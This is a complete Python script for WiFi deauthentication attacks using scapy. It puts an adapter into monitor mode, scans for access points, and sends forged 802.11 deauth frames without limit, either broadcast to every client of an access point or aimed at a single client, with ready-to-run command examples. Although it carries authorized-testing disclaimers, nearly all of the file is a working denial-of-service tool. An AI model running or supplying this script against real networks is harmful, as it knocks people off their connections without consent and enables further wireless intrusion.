#!/usr/bin/env python3
"""
WiFi Deauthentication Attack Script - Kali Linux Edition
==========================================================
WARNING: This script is for educational and authorized testing purposes only.
Unauthorized use of this script may be illegal and unethical.

This script performs WiFi deauthentication attacks using monitor mode.
Optimized for Kali Linux with aircrack-ng and scapy pre-installed.
Requires a WiFi adapter that supports monitor mode (like LEO X SYS).

Usage:
    sudo python3 deauth_attack.py --scan -i wlan0mon
    sudo python3 deauth_attack.py -i wlan0mon -t <BSSID>
"""

import sys
import os
import time
import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

# Suppress scapy warnings
import warnings
warnings.filterwarnings("ignore")

class WiFiDeauth:
    def __init__(self, interface):
        """
        Initialize the WiFi Deauthentication class
        
        Args:
            interface: Network interface name (e.g., 'wlan0', 'wlan1', etc.)
        """
        self.interface = interface
        self.packet_count = 0
        
    def set_monitor_mode(self):
        """
        Set the WiFi adapter to monitor mode using aircrack-ng (Kali Linux)
        """
        print(f"[*] Attempting to set {self.interface} to monitor mode...")
        try:
            # Check if aircrack-ng is available
            if os.system("which airmon-ng > /dev/null 2>&1") != 0:
                print("[-] airmon-ng not found. Install with: sudo apt-get install aircrack-ng")
                return False
            
            # Kill interfering processes (Kali-specific)
            print("[*] Killing interfering processes...")
            os.system("sudo airmon-ng check kill > /dev/null 2>&1")
            
            # Use airmon-ng to enable monitor mode (creates new interface)
            print(f"[*] Starting monitor mode on {self.interface}...")
            result = os.system(f"sudo airmon-ng start {self.interface} > /dev/null 2>&1")
            
            if result == 0:
                # Find the monitor interface (usually interface + 'mon')
                monitor_iface = f"{self.interface}mon"
                if monitor_iface not in get_if_list():
                    # Try other common names
                    for iface in get_if_list():
                        if 'mon' in iface.lower():
                            monitor_iface = iface
                            break
                
                print(f"[+] Monitor mode enabled! Use interface: {monitor_iface}")
                print(f"[!] Update your command to use: -i {monitor_iface}")
                return True
            else:
                # Fallback to manual method
                print("[*] Trying manual method...")
                os.system(f"sudo ifconfig {self.interface} down")
                os.system(f"sudo iwconfig {self.interface} mode monitor")
                os.system(f"sudo ifconfig {self.interface} up")
                print(f"[+] Monitor mode enabled on {self.interface}")
                return True
        except Exception as e:
            print(f"[-] Error setting monitor mode: {e}")
            print("[!] Try manually: sudo airmon-ng start <interface>")
            return False
    
    def deauth_attack(self, target_bssid, client_bssid=None, count=0, interval=0.1):
        """
        Perform deauthentication attack
        
        Args:
            target_bssid: MAC address of the target access point (LED Panel)
            client_bssid: MAC address of the client (None for broadcast)
            count: Number of packets to send (0 for infinite)
            interval: Time between packets in seconds
        """
        print(f"\n[*] Starting deauthentication attack...")
        print(f"[*] Target AP: {target_bssid}")
        print(f"[*] Client: {client_bssid if client_bssid else 'Broadcast (all clients)'}")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Count: {count if count > 0 else 'Infinite'}")
        print(f"[*] Interval: {interval}s")
        print("\n[!] Press Ctrl+C to stop\n")
        
        # Create deauthentication packet
        if client_bssid:
            # Targeted deauth (AP -> Client)
            packet1 = RadioTap() / Dot11(
                type=0, subtype=12,  # Deauthentication frame
                addr1=client_bssid,  # Destination (client)
                addr2=target_bssid,  # Source (AP)
                addr3=target_bssid   # BSSID
            ) / Dot11Deauth(reason=7)
            
            # Targeted deauth (Client -> AP)
            packet2 = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1=target_bssid,  # Destination (AP)
                addr2=client_bssid,  # Source (client)
                addr3=target_bssid   # BSSID
            ) / Dot11Deauth(reason=7)
        else:
            # Broadcast deauth (disconnect all clients)
            packet1 = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=target_bssid,
                addr3=target_bssid
            ) / Dot11Deauth(reason=7)
            
            packet2 = None
        
        try:
            sent = 0
            while True:
                # Send packet 1
                sendp(packet1, iface=self.interface, verbose=0)
                self.packet_count += 1
                sent += 1
                
                # Send packet 2 if client specified
                if packet2:
                    sendp(packet2, iface=self.interface, verbose=0)
                    self.packet_count += 1
                    sent += 1
                
                # Print progress
                if sent % 100 == 0:
                    print(f"[*] Sent {sent} deauth packets...", end='\r')
                
                # Check count limit
                if count > 0 and sent >= count:
                    break
                
                time.sleep(interval)
                
        except KeyboardInterrupt:
            print(f"\n\n[*] Attack stopped by user")
            print(f"[*] Total packets sent: {self.packet_count}")
        except Exception as e:
            print(f"\n[-] Error during attack: {e}")
    
    def scan_networks(self, duration=10):
        """
        Scan for available WiFi networks
        
        Args:
            duration: Scan duration in seconds
        """
        print(f"[*] Scanning for networks on {self.interface}...")
        print(f"[*] This will take {duration} seconds...\n")
        
        networks = {}
        
        def packet_handler(packet):
            if packet.haslayer(Dot11):
                if packet.type == 0 and packet.subtype == 8:  # Beacon frame
                    ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
                    bssid = packet[Dot11].addr2
                    if ssid and bssid not in networks:
                        networks[bssid] = ssid
                        print(f"[+] Found: {ssid} - {bssid}")
        
        try:
            sniff(iface=self.interface, prn=packet_handler, timeout=duration)
        except Exception as e:
            print(f"[-] Error during scan: {e}")
        
        return networks


def get_interface():
    """
    Get available network interfaces (Kali Linux optimized)
    """
    interfaces = get_if_list()
    wifi_interfaces = []
    
    # Look for WiFi interfaces (wlan, wifi, or monitor interfaces)
    for iface in interfaces:
        iface_lower = iface.lower()
        if ('wlan' in iface_lower or 'wifi' in iface_lower or 'mon' in iface_lower) and 'lo' not in iface_lower:
            wifi_interfaces.append(iface)
    
    # Also check using iwconfig
    try:
        iwconfig_output = os.popen('iwconfig 2>/dev/null | grep -o "^[^ ]*"').read().strip().split('\n')
        for iface in iwconfig_output:
            if iface and iface not in wifi_interfaces:
                wifi_interfaces.append(iface)
    except:
        pass
    
    if not wifi_interfaces:
        print("[!] No WiFi interfaces found. Available interfaces:")
        for iface in interfaces:
            if 'lo' not in iface.lower():
                print(f"    - {iface}")
        print("\n[*] Try: iwconfig or ip link show")
        return None
    
    return wifi_interfaces


def main():
    parser = argparse.ArgumentParser(
        description="WiFi Deauthentication Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples (Kali Linux):
  # Scan for networks
  sudo python3 deauth_attack.py --scan -i wlan0mon
  
  # Attack specific AP (broadcast to all clients)
  sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
  
  # Attack specific client
  sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66
  
  # Send limited packets
  sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF -n 100
  
  # Auto-enable monitor mode and scan
  sudo python3 deauth_attack.py --monitor --scan

WARNING: Use only on networks you own or have explicit permission to test.
        """
    )
    
    parser.add_argument('-i', '--interface', type=str, help='Network interface (e.g., wlan0)')
    parser.add_argument('-t', '--target', type=str, help='Target AP MAC address (BSSID)')
    parser.add_argument('-c', '--client', type=str, help='Client MAC address (optional)')
    parser.add_argument('-n', '--count', type=int, default=0, help='Number of packets (0 = infinite)')
    parser.add_argument('--interval', type=float, default=0.1, help='Interval between packets (seconds)')
    parser.add_argument('--scan', action='store_true', help='Scan for available networks')
    parser.add_argument('--monitor', action='store_true', help='Set interface to monitor mode')
    
    args = parser.parse_args()
    
    # Print warning
    print("=" * 60)
    print("WARNING: This tool is for authorized testing only!")
    print("Unauthorized use may be illegal and unethical.")
    print("=" * 60)
    print()
    
    # Get interface
    if not args.interface:
        interfaces = get_interface()
        if not interfaces:
            print("[-] Please specify an interface with -i")
            sys.exit(1)
        args.interface = interfaces[0]
        print(f"[*] Using interface: {args.interface}")
    
    # Initialize deauth class
    deauth = WiFiDeauth(args.interface)
    
    # Set monitor mode if requested
    if args.monitor:
        deauth.set_monitor_mode()
    
    # Scan networks
    if args.scan:
        networks = deauth.scan_networks()
        if networks:
            print(f"\n[+] Found {len(networks)} networks")
            print("\nTo attack a network, use:")
            print(f"  python deauth_attack.py -i {args.interface} -t <BSSID>")
        sys.exit(0)
    
    # Perform attack
    if not args.target:
        print("[-] Please specify a target BSSID with -t or use --scan to find networks")
        sys.exit(1)
    
    # Validate MAC address format
    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    import re
    if not re.match(mac_pattern, args.target):
        print("[-] Invalid MAC address format. Use format: AA:BB:CC:DD:EE:FF")
        sys.exit(1)
    
    if args.client and not re.match(mac_pattern, args.client):
        print("[-] Invalid client MAC address format")
        sys.exit(1)
    
    # Start attack
    deauth.deauth_attack(
        target_bssid=args.target,
        client_bssid=args.client,
        count=args.count,
        interval=args.interval
    )


if __name__ == "__main__":
    main()

